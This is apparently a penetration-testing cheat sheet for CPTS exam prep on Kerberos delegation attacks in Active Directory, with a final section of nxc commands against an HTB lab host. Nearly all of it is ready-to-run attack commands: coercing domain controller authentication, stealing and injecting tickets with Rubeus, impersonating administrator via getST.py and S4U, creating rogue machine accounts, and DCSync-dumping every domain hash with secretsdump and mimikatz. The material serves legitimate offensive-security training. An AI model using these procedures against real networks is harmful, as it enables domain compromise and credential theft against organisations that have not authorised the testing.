# methods

# Kerberos Delegation Attack Procedures

### CPTS Exam Prep — Windows & Linux

---

## Table of Contents

1. [Unconstrained Delegation](#1-unconstrained-delegation)
2. [Constrained Delegation](#2-constrained-delegation)
3. [Resource-Based Constrained Delegation (RBCD)](#3-resource-based-constrained-delegation-rbcd)
4. [SeEnableDelegationPrivilege Abuse](#4-seenabledelegationprivilege-abuse)
5. [Quick Decision Tree](#5-quick-decision-tree)

---

## 1. Unconstrained Delegation

### Enumeration

**Linux:**

```bash
# Find computers with unconstrained delegation
bloodhound-python -d domain.com -u user -p pass -c All -ns DC_IP

# PowerView via crackmapexec
crackmapexec ldap DC_IP -u user -p pass --trusted-for-delegation

# Impacket
findDelegation.py domain.com/user:pass
```

**Windows:**

```powershell
# PowerView
Get-DomainComputer -Unconstrained | select name, dnshostname

# Native AD
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select name

# BloodHound query
# "Find Computers with Unconstrained Delegation"
```

---

### Exploitation

**Linux:**

```bash
# Step 1 — Coerce DC authentication to compromised host
# PetitPotam
python3 PetitPotam.py COMPROMISED_HOST_IP DC_IP -u user -p pass

# Coercer (multi-protocol)
python3 Coercer.py coerce -u user -p pass -d domain.com \
  -l COMPROMISED_HOST_IP -t DC_IP

# Step 2 — Capture TGT (run on compromised host)
# Transfer Rubeus to compromised host first
# Then run from Windows side (see below)

# Step 3 — Use captured ticket
export KRB5CCNAME=dc_machine.ccache
secretsdump.py -k -no-pass DC.domain.com
```

**Windows (on compromised unconstrained host):**

```powershell
# Step 1 — Monitor for incoming TGTs
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Step 2 — Trigger coercion from Linux attack box (see above)

# Step 3 — Import captured TGT
.\Rubeus.exe ptt /ticket:BASE64_TICKET_FROM_MONITOR

# Step 4 — DCSync
.\mimikatz.exe
lsadump::dcsync /domain:domain.com /user:administrator
exit

# Alternative — dump all hashes
.\mimikatz.exe "lsadump::dcsync /domain:domain.com /all /csv" exit
```

---

## 2. Constrained Delegation

### Enumeration

**Linux:**

```bash
# Find accounts with constrained delegation
findDelegation.py domain.com/user:pass

# Specific enumeration
ldapsearch -H ldap://DC_IP -x \
  -D "user@domain.com" -w pass \
  -b "DC=domain,DC=com" \
  "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo
```

**Windows:**

```powershell
# Users with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# Computers with constrained delegation
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# Native AD
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} \
  -Properties msDS-AllowedToDelegateTo | select name, msDS-AllowedToDelegateTo
```

---

### Exploitation

**Linux:**

```bash
# Step 1 — Request TGS impersonating administrator
# With password
getST.py domain.com/svcaccount:Password \
  -spn cifs/TARGET.domain.com \
  -impersonate administrator

# With hash
getST.py domain.com/svcaccount \
  -hashes :NTHASH \
  -spn cifs/TARGET.domain.com \
  -impersonate administrator

# Step 2 — Use ticket
export KRB5CCNAME=administrator@cifs_TARGET.domain.com@DOMAIN.ccache

# Access target
psexec.py -k -no-pass administrator@TARGET.domain.com
wmiexec.py -k -no-pass administrator@TARGET.domain.com
secretsdump.py -k -no-pass TARGET.domain.com

# If delegated to LDAP → DCSync
getST.py domain.com/svcaccount:Password \
  -spn ldap/DC.domain.com \
  -impersonate administrator

export KRB5CCNAME=administrator@ldap_DC.domain.com@DOMAIN.ccache
secretsdump.py -k -no-pass DC.domain.com
```

**Windows:**

```powershell
# Step 1 — Request ticket with Rubeus
.\Rubeus.exe s4u \
  /user:svcaccount \
  /password:Password \
  /impersonateuser:administrator \
  /msdsspn:cifs/TARGET.domain.com \
  /ptt

# With hash
.\Rubeus.exe s4u \
  /user:svcaccount \
  /rc4:NTHASH \
  /impersonateuser:administrator \
  /msdsspn:cifs/TARGET.domain.com \
  /ptt

# Step 2 — Access target (ticket injected via /ptt)
dir \\TARGET.domain.com\C$
.\mimikatz.exe "lsadump::dcsync /domain:domain.com /user:administrator" exit
```

---

## 3. Resource-Based Constrained Delegation (RBCD)

### Enumeration

**Linux:**

```bash
# Find computers where you have GenericWrite/GenericAll
# Run BloodHound and look for:
# "Find Shortest Paths to Domain Admins"
# Check edges: GenericWrite, GenericAll, WriteProperty on computer objects

# Check MachineAccountQuota — critical first step
netexec ldap DC_IP -u user -p pass -M maq
# MachineAccountQuota: 10 → can create computer accounts
# MachineAccountQuota: 0  → need existing computer account

# Check existing RBCD settings
ldapsearch -H ldap://DC_IP -x \
  -D "user@domain.com" -w pass \
  -b "DC=domain,DC=com" \
  "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
  sAMAccountName
```

**Windows:**

```powershell
# Find computers you have write access to
Find-InterestingDomainACL -ResolveGUIDs | \
  Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty"} | \
  Where-Object {$_.ObjectType -match "computer"}

# Check MAQ
Get-DomainObject -Identity "DC=domain,DC=com" | select ms-ds-machineaccountquota
```

---

### Exploitation

**Linux:**

```bash
# Step 1 — Check MachineAccountQuota
netexec ldap DC_IP -u user -p pass -M maq

# Step 2a — Create fake computer account (if MAQ > 0)
addcomputer.py domain.com/user:pass \
  -computer-name 'FAKE$' \
  -computer-pass '<COMPUTER_PASSWORD>'

# Step 2b — Use existing owned computer (if MAQ = 0)
# Already have credentials for an existing computer account

# Step 3 — Set RBCD on target
rbcd.py \
  -delegate-from 'FAKE$' \
  -delegate-to 'TARGET$' \
  -action write \
  domain.com/user:pass

# Verify RBCD was set
rbcd.py \
  -delegate-to 'TARGET$' \
  -action read \
  domain.com/user:pass

# Step 4 — Request service ticket
getST.py domain.com/'FAKE$:FakePass123!' \
  -spn cifs/TARGET.domain.com \
  -impersonate administrator

# Step 5 — Use ticket
export KRB5CCNAME=administrator@cifs_TARGET.domain.com@DOMAIN.ccache
psexec.py -k -no-pass administrator@TARGET.domain.com
wmiexec.py -k -no-pass administrator@TARGET.domain.com
secretsdump.py -k -no-pass TARGET.domain.com
```

**Windows:**

```powershell
# Step 1 — Create fake computer (if MAQ > 0)
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE -Password (Read-Host -AsSecureString '<COMPUTER_PASSWORD>')

# Step 2 — Get SID of fake computer
$ComputerSid = Get-DomainComputer FAKE -Properties objectsid | Select -Expand objectsid

# Step 3 — Build security descriptor and set RBCD
$SD = New-Object Security.AccessControl.RawSecurityDescriptor `
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject `
  -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# Step 4 — Request ticket with Rubeus
.\Rubeus.exe s4u \
  /user:FAKE$ \
  /password:FakePass123! \
  /impersonateuser:administrator \
  /msdsspn:cifs/TARGET.domain.com \
  /ptt

# Step 5 — Access target
dir \\TARGET.domain.com\C$
PsExec.exe \\TARGET.domain.com cmd
```

---

## 4. SeEnableDelegationPrivilege Abuse

### Check for Privilege

**Linux:**

```bash
# Check via WinRM session
evil-winrm -i TARGET_IP -u user -p pass
whoami /priv | findstr /i "delegation"
```

**Windows:**

```powershell
whoami /priv
# Look for: SeEnableDelegationPrivilege  Enabled
```

---

### Exploitation — Configure Constrained Delegation Manually

**Windows (with SeEnableDelegationPrivilege + GenericAll on computer):**

```powershell
# Step 1 — Set constrained delegation flags on computer object
Set-ADAccountControl -Identity "TARGET$" -TrustedToAuthForDelegation $True
Set-ADObject -Identity "CN=TARGET,CN=COMPUTERS,DC=domain,DC=com" `
  -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.domain.com"}

# Verify
Get-ADComputer TARGET -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo
```

**Linux — Change computer account password:**

```bash
# Change password of computer you now control
netexec smb DC_IP -u user -p pass \
  -M change-password \
  -o USER='TARGET$' NEWPASS=NewPass123!
```

**Linux — Request LDAP ticket and DCSync:**

```bash
# Request TGS for LDAP service as DC (impersonate DC machine account)
getST.py 'domain.com/TARGET$:NewPass123!' \
  -spn ldap/dc.domain.com \
  -impersonate dc

# Use ticket for DCSync
KRB5CCNAME=dc@ldap_dc.domain.com@DOMAIN.ccache \
  secretsdump.py -k -no-pass dc.domain.com
```

---

## 5. Quick Decision Tree

```
What do you have?
        │
        ├── Compromised host WITH unconstrained delegation?
        │       └── Rubeus monitor → coerce DC (PetitPotam/Coercer) → steal TGT → DCSync
        │
        ├── Account/computer WITH constrained delegation (msDS-AllowedToDelegateTo)?
        │       └── getST.py -impersonate administrator → psexec/secretsdump
        │
        ├── GenericWrite/GenericAll on a COMPUTER object?
        │       ├── MAQ > 0 → addcomputer → rbcd.py write → getST.py → psexec
        │       └── MAQ = 0 → use owned computer account → rbcd.py write → getST.py → psexec
        │
        └── SeEnableDelegationPrivilege + GenericAll on computer?
                └── Set-ADAccountControl TrustedToAuthForDelegation
                    → Set msDS-AllowedToDelegateTo = ldap/DC
                    → change computer password
                    → getST.py impersonate DC
                    → secretsdump DCSync
```

### Key Commands Cheat Sheet

```bash
# Enumeration
findDelegation.py domain.com/user:pass
netexec ldap DC_IP -u user -p pass -M maq

# Create fake computer
addcomputer.py domain.com/user:<PASSWORD> -computer-name 'FAKE$' -computer-pass '<COMPUTER_PASSWORD>'

# Set RBCD
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write domain.com/user:pass

# Request ticket (constrained/RBCD)
getST.py domain.com/account:pass -spn SERVICE/TARGET -impersonate administrator

# Use ticket
export KRB5CCNAME=administrator@SERVICE_TARGET@DOMAIN.ccache
psexec.py -k -no-pass administrator@TARGET.domain.com
secretsdump.py -k -no-pass TARGET.domain.com

# Coerce DC (unconstrained)
python3 PetitPotam.py LISTENER_IP DC_IP
python3 Coercer.py coerce -u user -p pass -d domain.com -l LISTENER_IP -t DC_IP

# Monitor TGTs (Windows — unconstrained host)
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Rubeus S4U (constrained/RBCD — Windows)
.\Rubeus.exe s4u /user:account /password:pass /impersonateuser:administrator /msdsspn:cifs/TARGET /ptt

# Change computer password
netexec smb DC_IP -u user -p <PASSWORD> -M change-password -o USER='COMP$' NEWPASS=<NEW_PASSWORD>
```

### Key Things To Remember

- **Unconstrained** → need to be ON the machine + coerce DC auth
- **Constrained** → need creds/hash of delegating account → getST.py
- **RBCD** → need GenericWrite on computer + computer account you control
- **SeEnableDelegationPrivilege** → configure constrained manually → LDAP ticket → DCSync
- Always check **MachineAccountQuota** before planning RBCD
- Impersonate **administrator** or **DC machine account** for max impact
- LDAP service ticket on DC = **DCSync** capability
- All Linux attacks use **Impacket** — getST.py, secretsdump.py, psexec.py

---

> 💡 **CPTS Exam Tip:** BloodHound shows all delegation paths visually. After collecting data, run "Shortest Path to Domain Admins" and look for delegation edges. RBCD is the most common HTB delegation attack because it only needs GenericWrite on a computer object — no SeEnableDelegationPrivilege required.
> 

---

# 🚀 Delegation checks with nxc (clean set)

## 🔍 1. Constrained delegation (KCD)

```
nxc ldap10.129.231.105 \
-u'adfs_gmsa$' \
-H <NTLM_HASH> \
-d ghost.htb \
--dns-server10.129.231.105 \
--find-delegation
```

👉 This is the **most important one**

---

## 🔍 2. Unconstrained delegation (UCD)

```
nxc ldap10.129.231.105 \
-u'adfs_gmsa$' \
-H <NTLM_HASH> \
-d ghost.htb \
--dns-server10.129.231.105 \
--trusted-for-delegation
```

---

## 🔍 3. Check RBCD targets (indirect)

nxc doesn’t cleanly dump RBCD like impacket, but:

```
nxc ldap10.129.231.105 \
-u'adfs_gmsa$' \
-H <NTLM_HASH> \
-d ghost.htb \
--dns-server10.129.231.105 \
-M daclread
```

👉 Look for:

- `msDS-AllowedToActOnBehalfOfOtherIdentity`
- or weird write permission